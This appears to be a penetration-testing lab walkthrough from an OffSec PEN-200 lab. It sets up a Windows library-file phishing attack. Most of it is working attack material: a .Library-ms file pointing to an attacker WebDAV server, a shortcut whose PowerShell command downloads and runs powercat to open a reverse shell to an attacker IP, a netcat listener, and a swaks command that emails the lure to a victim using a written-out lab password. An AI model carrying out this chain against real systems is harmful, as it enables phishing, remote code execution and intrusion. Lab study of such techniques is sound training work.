## DAV setup

1. RDP to 192.168.x.250.

> xfreerdp /cert-ignore /u:offsec /p:'lab' /d:relia.com /v:192.168.248.250 +drive:kali,"/home/kali/Downloads/Share"

2.  Use Visual Studio Code to create the library file.

Note: Modify the IP address to the WebDAV server (our VPN/TUN0). Create a new text file and save it as **config.Library-ms**

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.167</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

3. Create a desktop shortcut (lnk).

For the location:
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.167:8000/powercat.ps1'); powercat -c 192.168.45.167 -p 4444 -e powershell"
```

4. Copy the files to your machine using the RDP file share.

5. Start a http server.

Copy nc.exe to your www directory
> cp "/usr/share/windows-resources/binaries/nc.exe" "/home/kali/offsec/pen200/Relia/www/" 

Starts a http server.
> python3 -m http.server 8000 --directory "/home/kali/offsec/pen200/Relia/www/"

7. Start a WebDAV server.

Starts a WebDAV server using the folder "/home/kali/Relia/webdav/".
> wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root "/home/kali/offsec/pen200/Relia/webdav/"

6. Start a listener.

Netcat Listener.
> nc -lvnp 4444

7) Send a email to our victim.

Sends a email to the server.
> sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @/home/kali/Relia/webdav/config.library-ms --server 192.168.248.189 --body "Attached is the link to the problematic email." --header "Subject: Urgent Mail Issue" --auth-user 'maildmz@relia.com' --auth-password 'DPuBT9tGCBrTbR' --suppress-data
